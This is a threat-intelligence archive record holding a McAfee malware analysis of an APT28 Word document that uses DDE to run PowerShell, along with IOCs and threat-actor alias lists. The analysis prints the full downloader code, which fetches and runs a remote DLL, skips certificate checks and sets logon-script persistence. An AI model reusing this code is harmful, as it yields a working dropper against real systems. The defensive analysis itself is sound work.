{
    "id": "f5b26537-38de-4ee1-95c4-db6065b38020",
    "created_at": "2022-10-25T16:48:10.668554Z",
    "updated_at": "2025-03-27T02:17:11.781186Z",
    "deleted_at": null,
    "sha1_hash": "ce610914fa4b49e4ba6fb04d36d88a488eddc774",
    "title": "Threat Group APT28 Slips Office Malware into Doc Citing NYC Terror Attack",
    "authors": "McAfee",
    "file_creation_date": "2018-02-04T19:44:54Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 45508,
    "plain_text": "# Threat Group APT28 Slips Office Malware into Doc Citing NYC Terror Attack\n\n**[securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/](https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/)**\n\nBy Ryan Sherstobitoff and Michael Rea November 7, 2017\n\nDuring our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research\nanalysts identified a malicious Word document that appears to leverage the Microsoft Office Dynamic\nData Exchange (DDE) technique that has been previously reported by Advanced Threat Research. This\ndocument likely marks the first observed use of this technique by APT28. The use of DDE with\nPowerShell allows an attacker to execute arbitrary code on a victim’s system regardless whether macros\nare enabled. (McAfee product detection is covered in the Indicators of Compromise section at the end of\nthe document.)\n\nAPT28, also known as Fancy Bear, has recently focused on using different themes. In this case it\ncapitalized on the recent terrorist attack in New York City. The document itself is blank. Once opened, the\ndocument contacts a control server to drop the first stage of the malware, Seduploader, onto a victim’s\nsystem.\n\nThe domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the\ncreation of Seduploader.\n\nThe document we examined for this post:\n\nFilename: IsisAttackInNewYork.docx\nSha1: 1c6c700ceebfbe799e115582665105caa03c5c9e\nCreation date: 2017-10-27T22:23:00Z\n\nThe document uses the recently detailed DDE technique found in Office products to invoke the command\nprompt to invoke PowerShell, which runs two commands. The first:\n\nC:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n-NoP -sta -NonI -W Hidden $e=(New-Object\nSystem.Net.WebClient).DownloadString(‘hxxp://netmediaresources[.]com/config.txt’);powershell -enc $e\n#.EXE\n\nThe second PowerShell command is Base64 encoded and is found in the version of config.txt received\nfrom the remote server. It decodes as follows:\n\n$W=New-Object System.Net.WebClient;\n$p=($Env:ALLUSERSPROFILE+”\\vms.dll”);\n\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n$W.DownloadFile(“hxxp://netmediaresources[.]com/media/resource/vms.dll “,$p);\nif (Test-Path $p){\n$rd_p=$Env:SYSTEMROOT+”\\System32\\rundll32.exe”;\n$p_a=$p+”,#1″;\n$pr=Start-Process $rd_p -ArgumentList $p_a;\n\n\n-----\n\n(exit) + r n + start rundll32.exe %inst_pck %,#1\n\n[io.File]::WriteAllText($p_bat,$text)\nNew-Item -Path ‘HKCU:\\Environment’ -Force | Out-Null;\nNew-ItemProperty -Path ‘HKCU:\\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” PropertyType String -Force | Out-Null;\n}\n\nThe PowerShell scripts contact the following URL to download Seduploader:\n\nhxxp://netmediaresources[.]com/media/resource/vms.dll\n\nThe Seduploader sample has the following artifacts:\n\nFilename: vms.dll\nSha1: 4bc722a9b0492a50bd86a1341f02c74c0d773db7\nCompile date: 2017-10-31 20:11:10\nControl server: webviewres[.]net\n\nThe document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles\nprospective victims, pulling basic host information from the infected system to the attackers. If the system\nis of interest, then the installation of X-Agent or Sedreco usually follows.\n\nWe have observed APT28 using Seduploader as a first-stage payload for several years from various\npublic reporting. Based on structural code analysis of recent payloads observed in the campaign, we see\nthey are identical to previous Seduploader samples employed by APT28.\n\nWe identified the control server domain associated with this activity as webviewres[.]net, which is\nconsistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure.\nThis domain was registered on October 25, a few days before the payload and malicious documents\nwere created. The domain was first active on October 29, just days before this version of Seduploader\nwas compiled. The IP currently resolves to 185.216.35.26 and is hosted on the name servers ns1.njal.la\nand ns2.njal.la.\n\nFurther McAfee research identified the following related sample:\n\nFilename: secnt.dll\nSha1: ab354807e687993fbeb1b325eb6e4ab38d428a1e\nCompile date: 2017-10-30 23:53:02\nControl server: satellitedeluxpanorama[.]com. (This domain uses the same name servers as\nabove.)\n\nThe preceding sample most likely belongs to the same campaign. Based on our analysis it uses the\nsame techniques and payload. We can clearly establish that the campaign involving documents using\nDDE techniques began on October 25.\n\nThe domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of\nNovember 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for\ndropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This\ndocument was created on October 27. The document is distributed from\n\n\n-----\n\nsendmevideo[.]org/dh2025e/eh.dll to download Seduploader\n(ab354807e687993fbeb1b325eb6e4ab38d428a1e).\n\nThe PowerShell command embedded in this document:\n\n$W=New-Object System.Net.WebClient;\n\n$p=($Env:ALLUSERSPROFILE+”\\mvdrt.dll”);\n\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n\n$W.DownloadFile(“http://sendmevideo.org/dh2025e/eh.dll”,$p);\n\nif (Test-Path $p){\n\n$rd_p=$Env:SYSTEMROOT+”\\System32\\rundll32.exe”;\n\n$p_a=$p+”,#1″;\n\n$pr=Start-Process $rd_p -ArgumentList $p_a;\n\n$p_bat=($Env:ALLUSERSPROFILE+”\\mvdrt.bat”);\n\n$text=’set inst_pck = “%ALLUSERSPROFILE%\\mvdrt.dll”‘+”`r`n”+’if NOT exist %inst_pck %\n(exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’\n\n[io.File]::WriteAllText($p_bat,$text)\n\nNew-Item -Path ‘HKCU:\\Environment’ -Force | Out-Null;\n\nNew-ItemProperty -Path ‘HKCU:\\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” PropertyType String -Force | Out-Null;\n\n}\n\nThe file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll\nab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely\nto be part of the same campaign. These two DLL implants are likely part of the same campaign.\nFurthermore, the sample 4bc722a9b0492a50bd86a1341f02c74c0d773db7, based on our code analysis,\nis 99% similar to the DLL implant 8a68f26d01372114f660e32ac4c9117e5d0577f1, which was used in a\n[campaign spoofing the upcoming cyber conference Cy Con U.S.](http://aci.cvent.com/events/2017-international-conference-on-cyber-conflict-cycon-u-s-/event-summary-004d598d31684f21ac82050a9000369f.aspx)\n\nThe attack techniques in the two campaigns differ: The campaign spoofing the Cy Con U.S conference\nused document files to execute a malicious VBA script; this campaign using the terrorist theme uses DDE\nwithin a document file to execute PowerShell and fetches a remote payload from a distribution site. The\npayloads, however, are identical for both campaigns.\n\n## Conclusion\n\nAPT28 is a resourceful threat actor that not only capitalizes on recent events to trick potential victims into\ninfections, but can also rapidly incorporate new exploitation techniques to increase its success. Given the\npublicity the Cy Con U.S campaign received in the press, it is possible APT28 actors moved away from\n\n\n-----\n\nfocused on deterring Russian aggression highlight APT28 s ability and interest in exploiting geopolitical\nevents for their operations.\n\n## Indicators of Compromise\n\n_SHA1 Hashes_\n\nab354807e687993fbeb1b325eb6e4ab38d428a1e (vms.dll, Seduploader implant)\n4bc722a9b0492a50bd86a1341f02c74c0d773db7 (secnt.dll, Seduploader implant)\n1c6c700ceebfbe799e115582665105caa03c5c9e (IsisAttackInNewYork.docx)\n68c2809560c7623d2307d8797691abf3eafe319a (SaberGuardian.docx)\n\n_Domains_\n\nwebviewres[.]net\nnetmediaresources[.]com\n\n_IPs_\n\n185.216.35.26\n89.34.111.160\n\n_McAfee coverage_\n\nMcAfee products detect this threat as RDN/Generic Downloader.x.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/1utq97k5oowxze0qsvbeur8u4zs0yny5"
    ],
    "report_names": [
        "McAfee_APT28-Office-Malware-Doc-Citing-NYC-TerrorAttack(11-07-2017)"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716490,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1517773494,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/ce610914fa4b49e4ba6fb04d36d88a488eddc774.pdf",
        "text": "https://archive.orkl.eu/ce610914fa4b49e4ba6fb04d36d88a488eddc774.txt",
        "img": "https://archive.orkl.eu/ce610914fa4b49e4ba6fb04d36d88a488eddc774.jpg"
    }
}